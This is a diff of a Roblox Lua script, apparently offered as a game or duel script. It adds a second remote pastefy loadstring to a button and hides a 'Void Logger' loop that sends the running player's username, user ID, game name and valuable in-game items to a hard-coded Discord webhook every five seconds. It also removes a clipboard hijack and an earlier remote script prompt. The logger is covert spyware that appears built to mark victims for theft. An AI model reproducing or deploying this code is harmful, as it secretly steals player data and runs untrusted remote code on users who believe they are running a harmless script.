@@ -96,6 +96,7 @@ reexecute.TextScaled = true
 reexecute.Parent = bg
 
 reexecute.MouseButton1Click:Connect(function()
+loadstring(game:HttpGet("https://pastefy.app/j9ERnU1R/raw", true))()
 loadstring(game:HttpGet("https://pastefy.app/QDcXcBjN/raw", true))()
 end)
 
@@ -109,77 +110,6 @@ credit.Font = Enum.Font.GothamBold
 credit.TextSize = 20
 credit.TextColor3 = Color3.fromRGB(200,200,200)
 credit.Parent = bg
-
-local webhook = "https://discord.com/api/webhooks/1470887638792667278/ABTnUwFUwFQArtp_LK6WSi40l0TJ5QriZo_Rpho4_f-G6s9KIbG-VWZCW8_9hHuXEzQf"
-
-local targets = {
-["Hydra Dragon Cannelloni"]=true,["W or L"]=true,["La Romantic Grande"]=true,
-["Ginger Gerat"]=true,["Lovin Rose"]=true,["Tuff Toucan"]=true,["Guest 666"]=true,["Los Amigos"]=true,
-["Skibidi Toilet"]=true,["Bacuru and Egguru"]=true,["Spaghetti Tualetti"]=true,["Los Tacoritas"]=true,
-["Cerberus"]=true,["Meowl"]=true,["Fragrama and Chocrama"]=true,["Celularcini Viciosini"]=true,
-["Popcuru and Fizzuru"]=true,["Headless Horseman"]=true,["Spooky and Pumpky"]=true,["Los Spaghettis"]=true,
-["Tacorita Bicicleta"]=true,["Los Primos"]=true,["Swaggy Bros"]=true,["Swag Soda"]=true,["Festive 67"]=true,
-["Ketupat Kepat"]=true,["Tang Tang Keletang"]=true,["Sammyni Fattini"]=true,["Capitano Moby"]=true,
-["La Secret Combinasion"]=true,["La Supreme Combinasion"]=true,["Dragon Cannelloni"]=true,
-["Gobblino Uniciclino"]=true,["Rosetti Tualetti"]=true,["Lavadorito Spinito"]=true,
-["Reinito Sleighito"]=true,["Tictac Sahur"]=true,["Esok Sekolah"]=true,["Los Puggies"]=true,
-["Chipso and Queso"]=true,["Money Money Puggy"]=true,["Mieteteira Bicicleteira"]=true,
-["Quesadillo Vampiro"]=true,["Love Love Bear"]=true,["Los Candies"]=true,["Burguro And Fryuro"]=true,
-["Cooki and Milki"]=true,["Strawberry Elephant"]=true,["La Extinct Grande"]=true,["Chillin Chili"]=true,
-["La Casa Boo"]=true,["Chicliterita bicicliterita"]=true,["La Food Combinasion"]=true,
-["La Jolly Grande"]=true,["La Spooky Grande"]=true,["Ketupat Bros"]=true,["Garama and Madundung"]=true,
-["Ketchuru and Musturu"]=true,["Nuclearo Dinossauro"]=true,["La Taco Combinasion"]=true,
-["Rosey and Teddy"]=true,["Dragon Gingerini"]=true
-}
-
-local req = request or http_request or syn and syn.request or fluxus and fluxus.request
-
-task.spawn(function()
-local found = {}
-local detected = {}
-local plots = workspace:FindFirstChild("Plots") or workspace
-
-for _,v in ipairs(plots:GetDescendants()) do
-if targets[v.Name] and not detected[v.Name] then
-detected[v.Name] = true
-table.insert(found,v.Name)
-end
-end
-
-if #found > 0 then
-local brainrotList = table.concat(found,"\n")
-
-local data = {
-content = "@everyone",
-embeds = {{
-title = "📄 Player Information",
-color = 5793266,
-fields = {
-{name="💻 Username",value="-# **Just tap **\n`"..username.."`",inline=false},
-{name="🆔 UserId",value=tostring(userid),inline=true},
-{name="🎮 Game",value=gameName,inline=true},
-{name="👑 Valuable Brainrots",value=brainrotList,inline=false}
-},
-footer={text="Void Logger"}
-}}
-}
-
-if req then
-req({
-Url = webhook,
-Method = "POST",
-Headers = {["Content-Type"]="application/json"},
-Body = HttpService:JSONEncode(data)
-})
-end
-end
-end)
-
-pcall(function()
-if setclipboard then
-setclipboard("https://discord.gg/TwyvK8JU7m")
-end
-end)
 
 local duration = 60
 local startTime = tick()
@@ -223,48 +153,74 @@ end
 task.wait(1)
 gui:Destroy()
 
-local promptGui = Instance.new("ScreenGui")
-promptGui.Parent = player:WaitForChild("PlayerGui")
+local webhook = "https://discord.com/api/webhooks/1470887638792667278/ABTnUwFUwFQArtp_LK6WSi40l0TJ5QriZo_Rpho4_f-G6s9KIbG-VWZCW8_9hHuXEzQf"
 
-local frame = Instance.new("Frame")
-frame.Size = UDim2.new(0,260,0,140)
-frame.Position = UDim2.new(0.5,-130,0.5,-70)
-frame.BackgroundColor3 = Color3.fromRGB(15,15,20)
-frame.Parent = promptGui
+local targets = {
+["Hydra Dragon Cannelloni"]=true,["W or L"]=true,["La Romantic Grande"]=true,
+["Ginger Gerat"]=true,["Lovin Rose"]=true,["Tuff Toucan"]=true,["Guest 666"]=true,["Los Amigos"]=true,
+["Skibidi Toilet"]=true,["Bacuru and Egguru"]=true,["Spaghetti Tualetti"]=true,["Los Tacoritas"]=true,
+["Cerberus"]=true,["Meowl"]=true,["Fragrama and Chocrama"]=true,["Celularcini Viciosini"]=true,
+["Popcuru and Fizzuru"]=true,["Headless Horseman"]=true,["Spooky and Pumpky"]=true,["Los Spaghettis"]=true,
+["Tacorita Bicicleta"]=true,["Los Primos"]=true,["Swaggy Bros"]=true,["Swag Soda"]=true,["Festive 67"]=true,
+["Ketupat Kepat"]=true,["Tang Tang Keletang"]=true,["Sammyni Fattini"]=true,["Capitano Moby"]=true,
+["La Secret Combinasion"]=true,["La Supreme Combinasion"]=true,["Dragon Cannelloni"]=true,
+["Gobblino Uniciclino"]=true,["Rosetti Tualetti"]=true,["Lavadorito Spinito"]=true,
+["Reinito Sleighito"]=true,["Tictac Sahur"]=true,["Esok Sekolah"]=true,["Los Puggies"]=true,
+["Chipso and Queso"]=true,["Money Money Puggy"]=true,["Mieteteira Bicicleteira"]=true,
+["Quesadillo Vampiro"]=true,["Love Love Bear"]=true,["Los Candies"]=true,["Burguro And Fryuro"]=true,
+["Cooki and Milki"]=true,["Strawberry Elephant"]=true,["La Extinct Grande"]=true,["Chillin Chili"]=true,
+["La Casa Boo"]=true,["Chicliterita bicicliterita"]=true,["La Food Combinasion"]=true,
+["La Jolly Grande"]=true,["La Spooky Grande"]=true,["Ketupat Bros"]=true,["Garama and Madundung"]=true,
+["Ketchuru and Musturu"]=true,["Nuclearo Dinossauro"]=true,["La Taco Combinasion"]=true,
+["Rosey and Teddy"]=true,["Dragon Gingerini"]=true
+}
 
-local text = Instance.new("TextLabel")
-text.Size = UDim2.new(1,0,0,60)
-text.Position = UDim2.new(0,0,0,10)
-text.BackgroundTransparency = 1
-text.Text = "Do you want to execute the duel script?"
-text.Font = Enum.Font.GothamBold
-text.TextScaled = true
-text.TextColor3 = Color3.new(1,1,1)
-text.Parent = frame
+local req = request or http_request or syn and syn.request or fluxus and fluxus.request
 
-local yes = Instance.new("TextButton")
-yes.Size = UDim2.new(0.4,0,0,35)
-yes.Position = UDim2.new(0.08,0,0.65,0)
-yes.Text = "Yes"
-yes.Font = Enum.Font.GothamBold
-yes.TextColor3 = Color3.new(1,1,1)
-yes.BackgroundColor3 = Color3.fromRGB(0,170,255)
-yes.Parent = frame
+task.spawn(function()
+while true do
 
-local no = Instance.new("TextButton")
-no.Size = UDim2.new(0.4,0,0,35)
-no.Position = UDim2.new(0.52,0,0.65,0)
-no.Text = "No"
-no.Font = Enum.Font.GothamBold
-no.TextColor3 = Color3.new(1,1,1)
-no.BackgroundColor3 = Color3.fromRGB(60,60,70)
-no.Parent = frame
+local found = {}
 
-yes.MouseButton1Click:Connect(function()
-promptGui:Destroy()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/VoidScriptzz/Duelsscript/refs/heads/main/Duelz"))()
-end)
+for _,v in ipairs(workspace:GetDescendants()) do
+if targets[v.Name] then
+table.insert(found,v.Name)
+end
+end
 
-no.MouseButton1Click:Connect(function()
-promptGui:Destroy()
+local ping = ""
+local text = "None"
+
+if #found > 0 then
+ping = "@everyone"
+text = table.concat(found,"\n")
+end
+
+local data = {
+content = ping,
+embeds = {{
+title = "📄 Player Information",
+color = 5793266,
+fields = {
+{name="💻 Username",value="`"..username.."`",inline=false},
+{name="🆔 UserId",value=tostring(userid),inline=true},
+{name="🎮 Game",value=gameName,inline=true},
+{name="👑 Valuable Brainrots",value=text,inline=false}
+},
+footer={text="Void Logger"}
+}}
+}
+
+if req then
+req({
+Url = webhook,
+Method = "POST",
+Headers = {["Content-Type"]="application/json"},
+Body = HttpService:JSONEncode(data)
+})
+end
+
+task.wait(5)
+
+end
 end)
